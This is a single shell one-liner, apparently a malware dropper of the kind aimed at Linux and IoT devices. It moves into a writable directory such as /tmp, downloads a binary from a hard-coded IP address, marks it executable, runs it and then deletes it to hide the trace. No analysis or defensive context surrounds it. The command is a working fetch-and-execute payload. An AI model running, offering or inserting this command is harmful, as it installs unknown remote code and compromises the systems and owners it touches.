cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.86/wget; chmod +x wget; ./wget; rm -rf wget
